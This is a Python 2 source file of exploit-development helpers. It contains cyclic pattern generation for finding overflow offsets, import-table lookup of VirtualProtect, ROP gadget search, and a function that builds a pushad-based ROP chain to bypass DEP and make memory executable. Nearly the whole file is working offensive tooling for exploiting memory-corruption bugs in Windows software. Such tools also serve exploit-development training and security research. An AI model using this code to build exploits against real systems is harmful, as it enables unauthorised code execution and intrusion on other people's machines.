import struct
import string
import os
import math
import random

def p32(data):
	return struct.pack("<I", data)
	
def pStr(word, size=4):
    if len(word)>size:
        return None
    value = 0
    for c in word[::-1]:
        value = value*16*16 + ord(c)
    return value

def pattern_create(max_length=5000, append=False):
	charset1 = string.ascii_uppercase
	charset2 = string.ascii_lowercase
	charset3 = string.digits
	if append:
		charset3 += ",.;+=-_!&()#@({})[]%"
	pattern = []
	
	while len(pattern)<max_length:
		for char_1 in charset1:
			for char_2 in charset2:
				for char_3 in charset3:
					if len(pattern) < max_length:
						pattern.append(char_1)
					if len(pattern) < max_length:
						pattern.append(char_2)
					if len(pattern) < max_length:
						pattern.append(char_3)
						
	return "".join(pattern)

def pattern_find(pattern, max_length=5000, append=False):
	pattern = p32(pattern)
	origin_pattern = pattern_create(max_length)
	offset = origin_pattern.find(pattern)
	return offset

# search function address by IAT
def searchFuncByIAT(IATs, func_name="VirtualProtect"):
	for module in IATs.keys():
		for func, address in IATs[module].items():
			if func == func_name:
				return address
	return 0

# search writable address and add offset to prevent null byte and newline
def searchWritableAddress(wriatableAddress):
	choose = random.randint(0, len(wriatableAddress)-1)
	counter = 0
	for address in wriatableAddress.keys():
		if counter == choose:
			return address
		else:
			counter += 1

def searchGadget(gadgets, gadget_type, gadget_pattern):
	if gadget_type not in gadgets.keys():
		return None
	shortest_gadget = None
	for vaddr in gadgets[gadget_type].keys():
		if gadgets[gadget_type][vaddr].startswith(gadget_pattern):
			if shortest_gadget is None or len(shortest_gadget[1])>=len(gadgets[gadget_type][vaddr]):
				shortest_gadget = (vaddr, gadgets[gadget_type][vaddr])
	return shortest_gadget

def neg(word):
	return 0x100000000 - word

def getPickupChain(collection, target_register, fptr):
	pickup_chain = []
	REGISTER = ["eax", "ebx", "ecx", "edx", "esi", "edi", "ebp"]
	# Check whether can do function call.
	if fptr is None or fptr == 0:
		return pickup_chain

	pickups = [ types for types in collection.keys() if types.startswith("pickup")]

	'''
		pop source_register ; ret
		fptr
		mov target_register, dword ptr [source_register] ; ret
	'''
	for types in pickups:
		if types.startswith("pickup" + target_register):
			pickup_gadget = searchGadget(collection, types, "mov")
			source_register = types[-3:]
			pop_gadget = searchGadget(collection, "pop", "pop " + source_register)
			if (pickup_gadget is not None) and (pop_gadget is not None):
				pickup_chain.append((pop_gadget[0], pop_gadget[1]))
				pickup_chain.append((fptr, "ptr to VirtualProtect"))
				pickup_chain.append((pickup_gadget[0], pickup_gadget[1]))
				return pickup_chain

	'''
		pop temp_register ; ret
		fptr
		mov source_register, dword ptr [temp_register] ; ret
		mov target_register, source_register ; ret
	'''
	for source_register in REGISTER:
		for types in pickups:
			if types.startswith("pickup" + source_register):
				temp_register = types[-3:]
				pop_temp_gadget = searchGadget(collection, "pop", "pop " + temp_register)
				pickup_gadget = searchGadget(collection, types, "mov")
				mov_gadget = searchGadget(collection, "mov"+target_register+source_register, "xchg") or searchGadget(collection, "mov"+target_register+source_register, "mov")
				if (pop_temp_gadget is not None) and (pickup_gadget is not None) and (mov_gadget is not None):
					pickup_chain.append((pop_temp_gadget[0], pop_temp_gadget[1]))
					pickup_chain.append((fptr, "ptr to VirtualProtect"))
					pickup_chain.append((pickup_gadget[0], pickup_gadget[1]))
					pickup_chain.append((mov_gadget[0], mov_gadget[1]))
					return pickup_chain

	'''
		pop temp1_register ; ret
		fptr
		mov temp2_register, dword ptr [temp1_register] ; ret
		mov temp3_register, temp2_register ; ret
		xor target_register, target_register ; ret
		add target_register, temp3_register ; ret
	'''
	for add_addr, add_text in collection["add"].items():
		if add_text.startswith("add " + target_register):
			pattern = add_text.split(" ; ")[0]
			temp3_register = pattern[-3:]
			add_gadget = searchGadget(collection, "add", "add " + target_register + ", " + temp3_register)
			xor_gadget = searchGadget(collection, "clear", "xor " + target_register)
			if (add_gadget is not None) and  (xor_gadget is not None):
				for mov_type in collection.keys():
					if (mov_type.startswith("mov"+temp3_register)):
						temp2_register = mov_type[-3:]
						mov_gadget = searchGadget(collection, mov_type, "xchg") or searchGadget(collection, mov_type, "mov")
						if mov_gadget is not None:
							for pickup_type in pickups:
								if pickup_type.startswith("pickup"+temp2_register):
									temp1_register = pickup_type[-3:]
									pickup_gadget = searchGadget(collection, pickup_type, "mov")
									pop_gadget = searchGadget(collection, "pop", "pop " + temp1_register)
									if (pickup_gadget is not None) and (pop_gadget is not None):
										pickup_chain.append((pop_gadget[0], pop_gadget[1]))
										pickup_chain.append((fptr, "ptr to VirtualProtect"))
										pickup_chain.append((pickup_gadget[0], pickup_gadget[1]))
										pickup_chain.append((mov_gadget[0], mov_gadget[1]))
										pickup_chain.append((xor_gadget[0], xor_gadget[1]))
										pickup_chain.append((add_gadget[0], add_gadget[1]))
										return pickup_chain

	return pickup_chain

'''
+-------------------------+
| virtualprotect strategy |
+-------------------------+
pushad
	+-----+--------------------------+--------------------------+
	| Reg | method1					 | method2					|
	+-----+--------------------------+--------------------------+
	| edi | ptr to ret 				 | ptr to ret 				|
	+-----+--------------------------+--------------------------+
	| esi |	ptr to &virtualprotect() | ptr to jmp [eax]			|
	+-----+--------------------------+--------------------------+
	| ebp | ptr to jmp esp			 | pop 4 bytes 				|
	+-----+--------------------------+--------------------------+
	| esp | arg1					 | arg1						|
	+-----+--------------------------+--------------------------+
	| ebx | arg2					 | arg2						|
	+-----+--------------------------+--------------------------+
	| edx | arg3					 | arg3						|
	+-----+--------------------------+--------------------------+
	| ecx | arg4					 | arg4						|
	+-----+--------------------------+--------------------------+
	| eax | nop * 4					 | ptr to &virtualprotect() |
	+-----+--------------------------+--------------------------+
'''	
# Generate a rop chain to bypass DEP.
def generate_ropchain(collection, IATs, wAddrs):
	virtualprotect = [ ("esi", "func"), ("ebp", "jmp"), ("ebx", "size"), ("edx", "rwx"),
	("ecx", "waddr"), ("edi", "nop"), ("eax", "nopcode"), ("all", "pushad") ]
	rop_chain = []
	Found_Gadget = True
	Need_Fix = None
	for step in virtualprotect:
		register, purpose = step

		if purpose == "func":
			virtualprotectPtr = searchFuncByIAT(IATs, "VirtualProtect")
			pickup_chain = getPickupChain(collection, register, virtualprotectPtr)
			if len(pickup_chain)>0:
				rop_chain.extend(pickup_chain)

			else:
				Found_Gadget = False
		elif purpose == "jmp":
			gadget = searchGadget(collection, "pop", "pop " + register)
			addr = searchGadget(collection, "jmpesp", "jmp esp")
			if addr is None:
				addr = searchGadget(collection, "jmpesp", "push esp ; ret")
				if addr is None:
					Found_Gadget = False
				else:
					addr = addr[0]
			else:
				addr = addr[0]
			
			if gadget is not None and Found_Gadget:
				print "0x%08x: %s" % (gadget[0], gadget[1])
				print "%s: 0x%08x" % ("ptr to jmp esp", addr)
				rop_chain.append((gadget[0], gadget[1]))
				rop_chain.append((addr, "ptr to jmp esp"))
			else:
				Found_Gadget = False


		elif purpose == "size":
			gadget = searchGadget(collection, "pop", "pop "+register)
			neg_gadget = searchGadget(collection, "neg", "neg "+register)
			if (gadget is None) or (neg_gadget is None):
				gadget = searchGadget(collection, "pop", "pop eax")
				neg_gadget = searchGadget(collection, "neg", "neg eax")
				# Since ebx will be zero(need check).
				mov_gadget = searchGadget(collection, "add", "add "+register+", eax")
				if (gadget is None) or (neg_gadget is None) or (mov_gadget is None):
					Found_Gadget = False
				else:
					rop_chain.append((gadget[0], gadget[1]))
					rop_chain.append((neg(0x201), "-0x201"))
					rop_chain.append((neg_gadget[0], neg_gadget[1]))
					rop_chain.append((mov_gadget[0], mov_gadget[1]))
					# Fix side effect (mov eax, [esp + 0xc])
					check_fix_list = mov_gadget[1].split(" ; ")
					for pattern in check_fix_list:
						if pattern.startswith("mov eax, dword ptr [esp +"):
							pattern = pattern.split("+")[-1]
							pattern = pattern.replace("]", "")
							try:
								Need_Fix = int(pattern)
							except ValueError:
								try:
									Need_Fix = int(pattern, base=16)
								except:
									Need_Fix = None
							except:
								Need_Fix = None
					if Need_Fix is not None:
						Need_Fix = len(rop_chain) -1 + int(math.ceil(Need_Fix/4))

			else:
				rop_chain.append((gadget[0], gadget[1]))
				rop_chain.append((neg(0x201), "dwsize"))
				rop_chain.append((neg_gadget[0], neg_gadget[1]))

		elif purpose == "rwx":
			gadget = searchGadget(collection, "pop", "pop " + register)
			neg_gadget = searchGadget(collection, "neg", "neg " + register)
			if (gadget is None) or (neg_gadget is None):
				gadget = searchGadget(collection, "clear", "xor " + register + ", " + register)
				inc_gadget = searchGadget(collection, "inc", "inc " + register)
				if (gadget is None) or (inc_gadget is None):
					Found_Gadget = False
				else:
					rop_chain.append((gadget[0], gadget[1]))
					for i in xrange(0x40):
						rop_chain.append((inc_gadget[0], inc_gadget[1]))

			else:
				rop_chain.append((gadget[0], gadget[1]))
				rop_chain.append((neg(0x40), "-0x40"))
				rop_chain.append((neg_gadget[0], neg_gadget[1]))
			
		elif purpose == "waddr":
			gadget = searchGadget(collection, "pop", "pop " + register)
			addr = searchWritableAddress(wAddrs)
			if (addr is None) or (gadget is None):
				Found_Gadget = False
			else:
				rop_chain.append((gadget[0], gadget[1]))
				rop_chain.append((addr, "writable address"))
				
		elif purpose == "nop":
			gadget = searchGadget(collection, "pop", "pop " + register)
			nop_gadget = searchGadget(collection, "nop", "ret") or searchGadget(collection, "nop", "nop")
			if (gadget is None) or (nop_gadget is None):
				Found_Gadget = False
			else:
				rop_chain.append((gadget[0], gadget[1]))
				rop_chain.append((nop_gadget[0], "ptr to [nop] ret"))
		
		elif purpose == "nopcode":
			gadget = searchGadget(collection, "pop", "pop " + register)
			if gadget is None:
				Found_Gadget = False
			else:
				rop_chain.append((gadget[0], gadget[1]))
				rop_chain.append((0x90909090, "nop code"))

		elif purpose == "pushad":
			gadget = searchGadget(collection, "pushad", "pushal") or searchGadget(collection, "pushad", "pushad")
			if gadget is None:
				Found_Gadget = False
			else:
				rop_chain.append((gadget[0], gadget[1]))

		if (Need_Fix is not None) and len(rop_chain)>=Need_Fix:
			gadget = searchGadget(collection, "addnum", "add esp, 4 ; ret")
			addr = searchWritableAddress(wAddrs)
			if (gadget is None) or (addr is None):
				Found_Gadget = False
			else:
				rop_chain.insert(Need_Fix, (gadget[0], gadget[1]))
				rop_chain.insert(Need_Fix+1, (addr, "gargabe"))
				Need_Fix = None

		if not Found_Gadget:
			break
			
	return rop_chain